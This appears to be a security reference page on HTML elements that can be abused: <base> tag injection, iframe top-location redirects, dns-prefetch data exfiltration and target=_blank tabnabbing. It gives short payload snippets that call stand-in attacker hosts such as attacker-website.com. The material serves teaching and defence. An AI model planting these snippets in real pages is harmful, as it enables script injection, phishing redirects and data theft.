# base

## Overview

The HTML [`<base>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) element specifies the base URL to use for all relative URLs in a document.

> [!info]
> If multiple `<base>` elements are used, only the first `href` and first `target` are obeyed — all others are ignored.

## Relative URL redirection

`<base>` tag injection allows redirecting relative URLs to an arbitrary host.

For example, for the following page, the browser will request a script from `https://attacker-website.com/assets/some-script.js`:

```html
<base href="https://attacker-website.com">

<script src="/assets/some-script.js"></script>
````

In other words, if there is a way to inject the `<base>` tag, it is possible to inject arbitrary JavaScript code into `<script>` elements that download scripts using relative URLs.

# iframe

## Overview

The [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) tag is used to embed an HTML document in another HTML document. If the source of the inserted document is located on another origin, the same-origin policy will block access to the content of the other document for both of them.

## Open redirect

Child documents can view and set the `location` property for parents, even if cross-origin, via `top.window.location`.
For example, if `vulnerable-website.com` contains the following `iframe`:

```html
<iframe src=//malicious-website.com/toplevel.html></iframe>
```

where `https://malicious-website.com/toplevel.html` is:

```html
<html>
  <head></head>
  <body>
    <script>
      top.window.location = "https://malicious-website.com/pwned.html"
    </script>
  </body>
</html>
```

when the `iframe` is loaded, the parent will be redirected to the `https://malware-website.com/pwned.html` page, even if the child document is loaded from a different origin. In this case, the same-origin policy will be bypassed because the `iframe` is not being sandboxed. Check out the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) iframe attribute.

## References

- [`<meta>` and `<iframe>` tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)
    

# link

## Overview

The [`<link>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link) HTML element specifies relationships between the current document and an external resource. This element is most commonly used to link to stylesheets, but is also used to establish site icons (both "favicon" style icons and icons for the home screen and apps on mobile devices) among other things.

## rel=dns-prefetch

The [`dns-prefetch`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/dns-prefetch) keyword for the `rel` attribute is a hint to browsers that the user is likely to need resources from the target resource's origin, and therefore the browser can likely improve the user experience by preemptively performing DNS resolution for that origin. It can be used to exfiltrate data in subdomains even with the restrictive CSP `connect-src` directive.

```html
<link rel="dns-prefetch" href="//AAA.BBB.CCC.DDD.attacker.webserver.com">
```

## References

- [Trail of Bits Blog: Escaping misconfigured VSCode extensions](https://blog.trailofbits.com/2023/02/21/vscode-extension-escape-vulnerability/)
    

# target attribute

## Overview

The [`target`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a) attribute specifies where to display the linked URL as a name for the browsing context (a tab, window, or `<iframe>`). The following keywords have special meanings for where to load the URL:

- `_self` - the current browsing context, by default.
    
- `_blank` - usually a new tab, but users can configure browsers to open a new window instead.
    
- `_parent` - the parent browsing context of the current one, if no parent, behaves as `_self`.
    
- `_top` - the topmost browsing context (the "highest" context that’s an ancestor of the current one), if no ancestors, behaves as `_self`.
    

## `_blank`

Using `target=_blank` allows the linked page to get partial access to the source page through the [`window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) API. The newly opened tab can then change the `window.opener.location` to a phishing page or execute JavaScript on the opener page.

> [!info]  
> In newer browser versions (e.g. Firefox 79+) setting `target="_blank"` on `<a>` elements implicitly provides the same `rel` behavior as setting `rel="noopener"`.

## References

- [Target="_blank" — the most underestimated vulnerability ever](https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c)